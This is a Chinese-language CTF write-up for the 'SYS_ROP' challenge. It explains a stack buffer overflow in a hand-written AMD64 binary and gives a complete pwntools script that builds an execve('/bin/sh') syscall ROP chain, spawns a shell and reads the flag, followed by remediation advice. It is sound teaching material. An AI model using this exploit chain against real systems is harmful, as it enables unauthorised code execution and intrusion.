# SYS_ROP

## 题目简述

题目是一个手写汇编的 AMD64 ELF。程序在栈上分配 `0x50` 字节，却通过 `read` 接收最多 `0x100` 字节，形成直接的返回地址覆盖。二进制没有 PIE 和栈 Canary，还在 `_start` 后主动放置了 `pop rdi`、`pop rsi`、`pop rdx`、`pop rax` 等 gadget；`.data` 中也已经保存 `/bin/sh`。

因此不需要泄露地址或依赖 libc，只需构造一条系统调用 ROP 链执行 `execve("/bin/sh", NULL, NULL)`。

## 解题过程

漏洞位于 `main`：

```nasm
sub rsp, 0x50
lea rax, [rbp-0x50]
mov rsi, rax
mov rdi, 0
mov rdx, 0x100
call read
```

从缓冲区起点到 saved RBP 是 `0x50` 字节，再越过 8 字节 saved RBP，故返回地址偏移为：

$0x50 + 8 = 88$。

程序末尾还直接提供了所需 gadget：

```nasm
pop rdi
ret
pop rsi
ret
pop rdx
ret
pop rax
ret
```

Linux AMD64 的 `execve` 系统调用号为 59。令 `RAX=59`、`RDI=&"/bin/sh"`、`RSI=0`、`RDX=0`，最后跳到任意一条 `syscall` 指令即可。源码中的 `bin_sh` 位于固定地址 `0x402010`。

利用脚本如下：

```python
from pwn import ELF, ROP, context, flat, remote

exe = context.binary = ELF("./chall", checksec=False)
rop = ROP(exe)

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
pop_rax = rop.find_gadget(["pop rax", "ret"]).address
syscall = rop.find_gadget(["syscall"]).address

payload = flat(
    b"A" * 88,
    pop_rax, 59,
    pop_rdi, 0x402010,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,
)

io = remote("127.0.0.1", 1337)
io.sendafter(b"Enter message: ", payload)
io.sendline(b"cat /challenge/flag.txt")
io.interactive()
```

进入 shell 后读取 flag：

```text
shellmates{yOu_4rE_a_true_H4CkeR}
```

## 方法总结

这是一条最小化的 syscall ROP 利用链：先计算精确覆盖偏移，再利用程序自带的寄存器装载 gadget 和固定字符串完成系统调用。由于整个链条不调用 libc，ASLR 对 libc 的随机化不会影响利用。

修复应首先让读取长度不超过目标缓冲区，并在构建时启用栈保护与 PIE。源码为了教学显式提供的一组 `pop` gadget 和 `/bin/sh` 字符串也显著降低了利用门槛，但它们只是便利条件；真正的根因仍是 `0x100` 字节输入写入 `0x50` 字节栈缓冲区。
